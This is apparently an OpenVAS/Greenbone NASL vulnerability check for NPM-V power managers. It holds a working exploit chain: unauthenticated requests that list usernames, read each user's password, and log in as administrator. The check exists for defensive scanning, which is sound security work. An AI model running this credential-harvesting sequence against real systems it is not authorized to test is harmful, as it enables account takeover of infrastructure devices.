###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_npm-v_login_vuln.nasl 11025 2018-08-17 08:27:37Z cfischer $
#
# NPM-V Password Leak and Reset vulnerability
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113036");
  script_version("$Revision: 11025 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:27:37 +0200 (Fri, 17 Aug 2018) $");
  script_tag(name:"creation_date", value:"2017-10-19 10:00:00 +0200 (Thu, 19 Oct 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("NPM-V Password Leak and Reset vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("GoAhead-Webs/banner");

  script_tag(name:"summary", value:"NPM-V 2.4.1 and before is vulnerable to Password Leak and Password Reset vulnerabilities.");
  script_tag(name:"vuldetect", value:"Tries to read a user's password from the web application and uses it attempt a login.");
  script_tag(name:"insight", value:"GET-Requests for reading and changing passwords and creating new users don't require authentication");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to get administrative access to the Network Power Manager");
  script_tag(name:"affected", value:"NPM-V 2.4.1 and before");
  script_tag(name:"solution", value:"Upgrade to NPM-V version 2.4.2");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42933/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default: 80 );

content = http_get_cache( port: port, item: "/user/user.html" );
if( ! ( "function loaddata()" >< content && "function loadlist()" >< content && "function deleteuser()" >< content && "function userchange()" >< content ) ) {
  exit( 0 );
}

ip = get_host_ip();
hostname = get_host_name();

# [IP]/userinfo lists all usernames
add_headers = make_array( "Cache-Control", "max-age=0", "Connection", "keep-alive", "Accept-Encoding", "gzip, deflate, sdch", "Accept-Language", "en-US,en;q=0.8", "Upgrade-Insecure-Requests", "1" );
req = http_get_req( port: port, url: "/userinfo", add_headers: add_headers, accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );


# The exploit doesn't seem to work if the request is using the hostname. Using the IP works, though. Thus the replacement.
req = ereg_replace( string: req, pattern: hostname, replace: ip, icase:TRUE );

res = http_keepalive_send_recv( port: port, data: req );

usernames = split( res, sep: "?", keep: FALSE );

foreach username ( usernames ) {
  add_headers = make_array( "Cache-Control", "max-age=0", "Connection", "keep-alive", "Accept-Encoding", "gzip, deflate, sdch", "Accept-Language", "en-US,en;q=0.8", "Upgrade-Insecure-Requests", "1" );
  req = http_get_req( port: port, url: "/userlistinfo?id1=" + username, add_headers: add_headers, accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );

  req = ereg_replace( string: req, pattern: hostname, replace: ip, icase: TRUE );
  res = http_keepalive_send_recv( port: port, data: req );

  if( "?" >!< res ) continue;

  userinfo = split( res, sep: "?", keep: FALSE );
  password = userinfo[1];

  if( !password ) continue;

  add_headers = make_array( "Cache-Control", "max-age=0", "Connection", "keep-alive", "Accept-Encoding", "gzip, deflate, sdch", "Accept-Language", "en-US,en;q=0.8", "Upgrade-Insecure-Requests", "1" );
  req = http_get_req( port: port, url: "/login?id1=" + username + "&id2=" + password, add_headers: add_headers, accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );

  req = ereg_replace( string: req, pattern: hostname, replace: ip, icase: TRUE );
  res = http_keepalive_send_recv( port: port, data: req );

  if( "302 Found" >< res && "Location: /home.html" >< res )
  {
    if( !success_users ) {
      success_users = username;
    }
    else {
      success_users = success_users + ", " + username;
    }
  }
}

if( success_users )
{
  report = "The script could successfully acquire credentials and use them to login for following users: " + success_users;
  security_message( port: port, data: report );
  exit( 0 );
}

exit( 99 );
